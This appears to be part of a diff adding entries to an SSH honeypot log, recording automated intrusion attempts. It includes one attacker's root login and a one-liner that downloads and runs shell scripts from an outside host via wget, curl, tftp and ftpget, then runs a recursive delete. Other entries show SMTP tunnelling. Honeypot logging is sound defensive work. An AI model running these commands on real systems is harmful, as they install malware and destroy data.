@@ -3677,3 +3677,75 @@
 2017-11-05T08:38:32+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] direct-tcp connection request to 72.167.238.29:25 from ::1:37522
 2017-11-05T08:39:29+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] got channel 'direct-tcpip' request
 2017-11-05T08:39:29+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] direct-tcp connection request to 188.125.69.79:25 from ::1:44787
+2017-11-05T08:40:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] got channel 'direct-tcpip' request
+2017-11-05T08:40:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] direct-tcp connection request to 188.125.69.79:25 from ::1:19419
+2017-11-05T08:40:09+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 45.76.132.32:36010 (10.3.66.85:2222) [session: f469948f8349]
+2017-11-05T08:40:09+0000 [HoneyPotSSHTransport,617,45.76.132.32] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-11-05T08:40:09+0000 [HoneyPotSSHTransport,617,45.76.132.32] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-11-05T08:40:09+0000 [HoneyPotSSHTransport,617,45.76.132.32] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-11-05T08:40:09+0000 [HoneyPotSSHTransport,617,45.76.132.32] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-11-05T08:40:09+0000 [HoneyPotSSHTransport,617,45.76.132.32] NEW KEYS
+2017-11-05T08:40:09+0000 [HoneyPotSSHTransport,617,45.76.132.32] starting service 'ssh-userauth'
+2017-11-05T08:40:09+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,617,45.76.132.32] 'root' trying auth 'password'
+2017-11-05T08:40:09+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,617,45.76.132.32] login attempt [root/] succeeded
+2017-11-05T08:40:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,617,45.76.132.32] 'root' authenticated with 'password'
+2017-11-05T08:40:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,617,45.76.132.32] starting service 'ssh-connection'
+2017-11-05T08:40:11+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] got channel 'session' request
+2017-11-05T08:40:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] channel open
+2017-11-05T08:40:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.38.146.89/beetles.sh; curl -O http://89.38.146.89/beetles.sh; chmod 777 beetles.sh; sh beetles.sh; tftp 89.38.146.89 -c get beetle.sh; chmod 777 beetle.sh; sh beetle.sh; tftp -r beetle2.sh -g 89.38.146.89; chmod 777 beetle2.sh; sh beetle2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.38.146.89 beetleftp.sh beetleftp.sh; sh beetleftp.sh; rm -rf beetles.sh beetle.sh beetle2.sh beetleftp.sh; rm -rf *"
+2017-11-05T08:40:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] Opening TTY Log: log/tty/20171105-084011-f469948f8349-0e.log
+2017-11-05T08:40:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.38.146.89/beetles.sh; curl -O http://89.38.146.89/beetles.sh; chmod 777 beetles.sh; sh beetles.sh; tftp 89.38.146.89 -c get beetle.sh; chmod 777 beetle.sh; sh beetle.sh; tftp -r beetle2.sh -g 89.38.146.89; chmod 777 beetle2.sh; sh beetle2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.38.146.89 beetleftp.sh beetleftp.sh; sh beetleftp.sh; rm -rf beetles.sh beetle.sh beetle2.sh beetleftp.sh; rm -rf *
+2017-11-05T08:40:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] Command found: cd /tmp
+2017-11-05T08:40:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] Command found: cd /var/run
+2017-11-05T08:40:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] Command found: cd /mnt
+2017-11-05T08:40:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] Command found: cd /root
+2017-11-05T08:40:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] Command found: cd /
+2017-11-05T08:40:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] Command found: wget http://89.38.146.89/beetles.sh
+2017-11-05T08:40:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://89.38.146.89/beetles.sh>
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Not storing duplicate content f80fb0bd5bad239ba382226e73c80be3da5cebcf35ba280884e22c051a117087
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: curl -O http://89.38.146.89/beetles.sh
+2017-11-05T08:40:11+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://89.38.146.89/beetles.sh>
+2017-11-05T08:40:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://89.38.146.89/beetles.sh>
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Not storing duplicate content f80fb0bd5bad239ba382226e73c80be3da5cebcf35ba280884e22c051a117087
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: chmod 777 /beetles.sh
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: sh /beetles.sh
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: tftp 89.38.146.89 -c get beetle.sh
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: chmod 777 beetle.sh
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: sh beetle.sh
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: tftp -r beetle2.sh -g 89.38.146.89
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: chmod 777 beetle2.sh
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: sh beetle2.sh
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 89.38.146.89 beetleftp.sh beetleftp.sh
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Not storing duplicate content f4857bfb7bdb3ec0deea605d239d6e61d12828d2840d5d6d24c1e5de0b91a81f
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: sh /beetleftp.sh
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: rm -rf /beetles.sh beetle.sh beetle2.sh /beetleftp.sh
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20171105-084011-f469948f8349-0e.log after 0 seconds
+2017-11-05T08:40:11+0000 [HTTPPageDownloader,client] sending close 0
+2017-11-05T08:40:11+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://89.38.146.89/beetles.sh>
+2017-11-05T08:40:21+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,617,45.76.132.32] remote close
+2017-11-05T08:40:21+0000 [HoneyPotSSHTransport,617,45.76.132.32] avatar root logging out
+2017-11-05T08:40:21+0000 [HoneyPotSSHTransport,617,45.76.132.32] connection lost
+2017-11-05T08:40:21+0000 [HoneyPotSSHTransport,617,45.76.132.32] Connection lost after 12 seconds
+2017-11-05T08:40:34+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 27.76.110.61:51426 (10.3.66.85:2222) [session: 77e2f091c2f5]
+2017-11-05T08:40:35+0000 [HoneyPotSSHTransport,618,27.76.110.61] Remote SSH version: SSH-2.0-Granados-1.0
+2017-11-05T08:40:35+0000 [HoneyPotSSHTransport,618,27.76.110.61] Disconnecting with error, code 3
+	reason: couldn't match all kex parts
+2017-11-05T08:40:35+0000 [HoneyPotSSHTransport,618,27.76.110.61] connection lost
+2017-11-05T08:40:35+0000 [HoneyPotSSHTransport,618,27.76.110.61] Connection lost after 0 seconds
+2017-11-05T08:41:31+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] got channel 'direct-tcpip' request
+2017-11-05T08:41:31+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] direct-tcp connection request to 206.152.134.65:25 from ::1:15659
+2017-11-05T08:41:55+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] got channel 'direct-tcpip' request
+2017-11-05T08:41:55+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] direct-tcp connection request to 72.21.70.125:25 from ::1:12075
+2017-11-05T08:42:20+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] got channel 'direct-tcpip' request
+2017-11-05T08:42:20+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] direct-tcp connection request to 213.199.154.234:25 from ::1:39497
+2017-11-05T08:43:04+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] got channel 'direct-tcpip' request
+2017-11-05T08:43:04+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] direct-tcp connection request to 212.54.42.8:25 from ::1:32182
+2017-11-05T08:43:16+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] got channel 'direct-tcpip' request
+2017-11-05T08:43:16+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] direct-tcp connection request to 104.47.54.33:25 from ::1:26313
+2017-11-05T08:43:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] got channel 'direct-tcpip' request
+2017-11-05T08:43:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] direct-tcp connection request to 209.17.115.10:25 from ::1:16121
+2017-11-05T08:45:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] got channel 'direct-tcpip' request
+2017-11-05T08:45:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,613,91.195.103.195] direct-tcp connection request to 64.182.231.120:25 from ::1:45569
